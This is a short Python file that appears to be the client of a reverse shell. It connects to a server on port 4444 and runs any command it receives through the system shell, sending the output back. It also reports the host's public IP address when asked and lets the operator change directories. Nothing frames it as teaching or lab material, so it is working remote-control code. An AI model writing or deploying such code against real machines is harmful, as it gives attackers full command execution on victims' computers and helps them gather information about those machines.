import socket
import subprocess
import os
import requests
import ctypes

SERVER_IP = "127.0.0.1"
SERVER_PORT = 4444

def start_client(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))

    while True:
        command = client.recv(1024).decode().strip()
        # print(f"[Received Command] {command}")

        if command.lower() == "exit":
            break

        # get public ip
        if command.lower() == "getip":
            try:
                r = requests.get('https://api.ipify.org?format=json')
                response = r.json()
                output = response['ip']
            except requests.exceptions.RequestException as e:
                output = f"Error fetching IP: {e}"
            client.send(output.encode())
            continue
        
        # path handling
        if command.startswith("cd "):
            try:
                # extract the path
                _, path = command.split("cd ", 1)
                path = path.strip()

                # change the path
                os.chdir(path)

                # change to the new directory
                new_dir = os.getcwd()
                output = f"Changed directory to {new_dir}"
            except Exception as e:
                output = f"Error changing directory: {e}"
        else:
            try:
                output = subprocess.check_output(
                    command, shell=True, stderr=subprocess.STDOUT, text=True
                )
            except subprocess.CalledProcessError as e:
                output = e.output

        client.send(output.encode())

    client.close()

if __name__ == "__main__":
    start_client(SERVER_IP, SERVER_PORT)
